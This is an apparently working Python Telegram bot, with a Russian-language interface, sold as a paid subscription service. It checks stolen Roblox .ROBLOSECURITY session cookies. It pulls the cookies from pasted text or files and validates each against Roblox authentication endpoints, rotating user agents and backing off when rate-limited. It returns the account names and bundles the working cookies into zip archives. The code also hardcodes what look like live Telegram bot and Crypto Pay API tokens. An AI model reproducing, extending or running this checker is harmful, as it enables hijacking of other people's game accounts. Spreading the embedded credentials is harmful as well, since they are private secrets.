import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# Конфигурация
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"
ADMIN_USERNAME = "@pirkw"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """Создание многоразового инвойса для оплаты"""
        try:
            payload = {
                'asset': 'USDT',  # USDT в сети Tron (TRC-20)
                'amount': str(amount),
                'description': description,
                'hidden_message': f'Оплата подписки для пользователя {user_id}',
                'paid_btn_name': 'viewItem',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 86400,  # 24 часа
                'subscription': True  # Многоразовый счет
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"Ошибка API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка создания инвойса: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """Проверка статуса инвойса"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "Инвойс не найден"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка проверки статуса: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.subscriptions = {}
        self.free_trials = {}
        self.crypto_payment = CryptoPayment()
        self.subscription_price = 1.0  # 1 USDT ≈ 75 рублей
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"⚠️ Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"⚠️ Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def check_free_trial(self, user_id):
        """Проверка бесплатного пробного периода"""
        if user_id not in self.free_trials:
            # Даем 3 дня бесплатного использования
            self.free_trials[user_id] = {
                'start_date': datetime.now(),
                'end_date': datetime.now() + timedelta(days=3),
                'checks_count': 0
            }
            return True, "✅ Вам доступен бесплатный пробный период 3 дня!"
        
        trial_data = self.free_trials[user_id]
        
        if datetime.now() > trial_data['end_date']:
            return False, "❌ Бесплатный период закончился. Оформите подписку за 1 USDT (≈75₽)"
        
        trial_data['checks_count'] += 1
        days_left = (trial_data['end_date'] - datetime.now()).days
        return True, f"✅ Бесплатный период активен. Осталось {days_left} дней"

    def activate_subscription(self, user_id):
        """Активация подписки"""
        self.subscriptions[user_id] = {
            'activated_date': datetime.now(),
            'is_active': True,
            'payment_method': 'cryptobot'
        }
        # Удаляем из бесплатных пробных периодов
        if user_id in self.free_trials:
            del self.free_trials[user_id]

    def extract_cookies_from_text(self, text):
        cookies = []
        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]+(?:\|[^\s]*)*'
        warning_matches = re.findall(warning_pattern, text)
        
        for match in warning_matches:
            cookie_candidate = match.strip()
            if len(cookie_candidate) > 50:
                cookies.append(cookie_candidate)
                print(f"🔍 Найдена куки: {cookie_candidate[:80]}...")
        
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text and
                'Sharing-this-will-allow-someone-to-log-in-as-you' in clean_text):
                cookies.append(clean_text)
                print(f"🔍 Найдена чистая куки: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        return cookie_data.strip()

    def simple_cookie_validation(self, cookie_data):
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        time.sleep(random.uniform(1, 3))
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
                
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
            
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "✅ VALID - Home page access", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"❌ Ошибка проверки: {e}")
            return False, cookie_clean, f"❌ ERROR - {str(e)}", "Unknown", "Unknown"
        
        return False, cookie_clean, "❌ INVALID - All checks failed", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"🔍 Найдено куки в тексте: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "❌ В тексте не найдено ни одной куки"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"🔍 Проверяю куки {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"✅ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"❌ {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def get_command_keyboard(self):
        """Клавиатура с командами для нижней части сообщений"""
        keyboard = [
            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies"),
             InlineKeyboardButton("📊 Статистика", callback_data="show_stats")],
            [InlineKeyboardButton("💎 Подписка", callback_data="subscription_info"),
             InlineKeyboardButton("ℹ️ Помощь", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def show_trial_window(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показывает окно с предложением бесплатного периода"""
    user_id = update.effective_user.id
    
    trial_text = """
🎁 БЕСПЛАТНЫЙ ПРОБНЫЙ ПЕРИОД

Вам доступно:
• 3 дня бесплатного использования
• Полный функционал бота
• Неограниченное количество проверок

После окончания пробного периода:
• Подписка навсегда - всего 1 USDT (≈75₽)
• Доступ ко всем функциям
• Приоритетная поддержка

Начните использовать бот прямо сейчас!
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ Начать бесплатный период", callback_data="start_free_trial")],
        [InlineKeyboardButton("💎 Купить подписку за 1 USDT", callback_data="buy_subscription")],
        [InlineKeyboardButton("❌ Отказаться", callback_data="cancel_trial")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'message'):
        await update.message.reply_text(trial_text, reply_markup=reply_markup)
    else:
        await update.edit_message_text(trial_text, reply_markup=reply_markup)

async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Создание инвойса для оплаты"""
    amount = checker.subscription_price
    
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description="Подписка на бота проверки куки (навсегда)",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
💎 ОПЛАТА ПОДПИСКИ

Сумма: {amount} USDT (≈75₽)
Сеть: TRC-20 (Tron)
Статус: Многоразовый счет

Для оплаты:
1. Нажмите кнопку "Перейти к оплате"
2. Оплатите {amount} USDT
3. Сделайте скриншот оплаты
4. Отправьте скриншот {ADMIN_USERNAME}

После проверки оплаты подписка будет активирована!
        """
        
        keyboard = [
            [InlineKeyboardButton("🔗 Перейти к оплате", url=invoice_url)],
            [InlineKeyboardButton("📸 Отправить скриншот", url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
            [InlineKeyboardButton("🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton("🔙 Назад", callback_data="subscription_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if hasattr(update, 'message'):
            await update.message.reply_text(payment_text, reply_markup=reply_markup)
        else:
            await update.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        error_text = f"""
❌ ОШИБКА СОЗДАНИЯ СЧЕТА

Не удалось создать счет для оплаты.
Пожалуйста, попробуйте позже или свяжитесь с {ADMIN_USERNAME}

Ошибка: {result}
        """
        await update.edit_message_text(error_text)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_trial_window(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Проверяем есть ли подписка
    if user_id in checker.subscriptions and checker.subscriptions[user_id]['is_active']:
        # Пользователь с активной подпиской
        await process_cookie_check(update, user_id)
        return
    
    # Проверяем бесплатный период
    has_trial, trial_message = checker.check_free_trial(user_id)
    
    if not has_trial:
        # Показываем окно с предложением подписки
        subscription_text = f"""
💎 ТРЕБУЕТСЯ ПОДПИСКА

Ваш бесплатный пробный период закончился.
Для продолжения использования бота необходимо оформить подписку.

Всего 1 USDT (≈75₽) за永久 (навсегда)! ✅

Преимущества подписки:
• Неограниченные проверки куки
• Приоритетная обработка
• Все функции бота
• Поддержка 24/7
        """
        
        keyboard = [
            [InlineKeyboardButton("💎 Купить подписку за 1 USDT", callback_data="buy_subscription")],
            [InlineKeyboardButton("🔍 Узнать подробности", callback_data="subscription_details")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(subscription_text, reply_markup=reply_markup)
        return
    
    # Если есть бесплатный период, обрабатываем проверку
    await process_cookie_check(update, user_id)

async def process_cookie_check(update: Update, user_id: int):
    """Обработка проверки куки"""
    if update.message.text:
        text_content = update.message.text
        await update.message.reply_text("🔍 Ищу куки в тексте...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(text_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("❌ Не удалось найти куки в тексте.")
            return
        
        # Показываем результаты
        if user_id in checker.free_trials:
            trial_data = checker.free_trials[user_id]
            days_left = (trial_data['end_date'] - datetime.now()).days
            checks_count = trial_data['checks_count']
            
            trial_info = f"\n🎁 Бесплатный период:\n• Осталось дней: {days_left}\n• Проверок сделано: {checks_count}"
        else:
            trial_info = "\n💎 Статус: Активная подписка"
        
        summary = f"""
📋 РЕЗУЛЬТАТЫ:

• Всего обработано: {len(valid_cookies) + len(invalid_cookies)}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%
{trial_info}
        """
        
        keyboard = [
            [InlineKeyboardButton("📁 Распределить по файлам", callback_data="distribute_files")],
            [InlineKeyboardButton("📦 Скачать общий файл", callback_data="download_combined")]
        ]
        
        if user_id in checker.free_trials:
            keyboard.append([InlineKeyboardButton("💎 Купить подписку за 1 USDT", callback_data="buy_subscription")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(summary, reply_markup=reply_markup)

    elif update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        await update.message.reply_text("🔍 Обрабатываю файл...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(file_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("❌ В файле не найдено куки")
            os.remove(file_path)
            return
        
        # Аналогичная логика для файлов
        await update.message.reply_text("✅ Файл обработан!")
        os.remove(file_path)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий кнопок"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "start_free_trial":
        has_trial, trial_message = checker.check_free_trial(user_id)
        await query.edit_message_text(
            f"🎁 {trial_message}\n\n"
            f"Теперь вы можете отправлять куки для проверки!\n\n"
            f"Просто отправьте куки текстом или файлом."
        )
    
    elif query.data == "buy_subscription":
        await create_payment_invoice(query, context, user_id)
    
    elif query.data.startswith("check_payment_"):
        invoice_id = int(query.data.split("_")[2])
        await query.edit_message_text("🔍 Проверяю статус оплаты...")
        
        success, result = await checker.crypto_payment.check_invoice_status(invoice_id)
        
        if success and result.get('status') == 'paid':
            # Активируем подписку
            checker.activate_subscription(user_id)
            await query.edit_message_text(
                "✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
                "🎉 Ваша подписка активирована навсегда!\n\n"
                "Теперь вы можете использовать все функции бота без ограничений."
            )
        else:
            await query.edit_message_text(
                "❌ ОПЛАТА НЕ НАЙДЕНА\n\n"
                "Если вы произвели оплату:\n"
                "1. Убедитесь, что транзакция завершена\n"
                "2. Отправьте скриншот оплаты " + ADMIN_USERNAME + "\n"
                "3. Подождите несколько минут\n\n"
                "Или попробуйте проверить снова через 5 минут"
            )
    
    elif query.data == "subscription_info":
        await show_trial_window(query, context)
    
    elif query.data == "show_stats":
        stats_text = f"""
📊 СТАТИСТИКА ПРОВЕРОК:

• Всего проверено: {checker.checked_count}
• Валидных куки: {checker.valid_count}
• Невалидных: {checker.checked_count - checker.valid_count}
• Процент валидных: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
• Активных подписок: {len(checker.subscriptions)}
• Бесплатных пользователей: {len(checker.free_trials)}
        """
        await query.edit_message_text(
            stats_text,
            reply_markup=checker.get_command_keyboard()
        )
    
    elif query.data == "check_cookies":
        await query.edit_message_text(
            "🔍 Отправьте куки для проверки:\n\n"
            "Вы можете отправить:\n"
            "• Текст с куки\n"
            "• Файл .txt с куки\n"
            "• Несколько куки в одном сообщении",
            reply_markup=checker.get_command_keyboard()
        )
    
    elif query.data in ["distribute_files", "download_combined"]:
        if query.data == "distribute_files":
            await query.edit_message_text("📁 Создаю отдельные файлы для каждой куки...")
            zip_filename = checker.create_individual_files(user_id)
            if zip_filename and os.path.exists(zip_filename):
                with open(zip_filename, 'rb') as zip_file:
                    await query.message.reply_document(
                        document=zip_file,
                        caption=f"📁 Архив с {len(checker.user_cookies[user_id]['valid_cookies'])} отдельными файлами куки"
                    )
                os.remove(zip_filename)
            else:
                await query.message.reply_text("❌ Не удалось создать файлы распределения")
        
        elif query.data == "download_combined":
            # Логика скачивания общего файла
            pass
    
    elif query.data in ["cancel_trial", "back_to_trial", "subscription_details"]:
        await show_trial_window(query, context)
    
    elif query.data == "help_command":
        help_text = f"""
ℹ️ ПОМОЩЬ ПО БОТУ

Как использовать:
1. Отправьте куки текстом или файлом
2. Бот проверит валидность
3. Получите результаты

Оплата подписки:
• 1 USDT (≈75₽) за永久 (навсегда)
• Оплата через Crypto Bot (USDT TRC-20)
• После оплаты отправьте скриншот {ADMIN_USERNAME}

Поддержка: {ADMIN_USERNAME}
        """
        await query.edit_message_text(
            help_text,
            reply_markup=checker.get_command_keyboard()
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Бот проверки Roblox куки с оплатой запущен...")
    print("✅ Бот готов к работе!")
    app.run_polling()

if __name__ == "__main__":
    main()
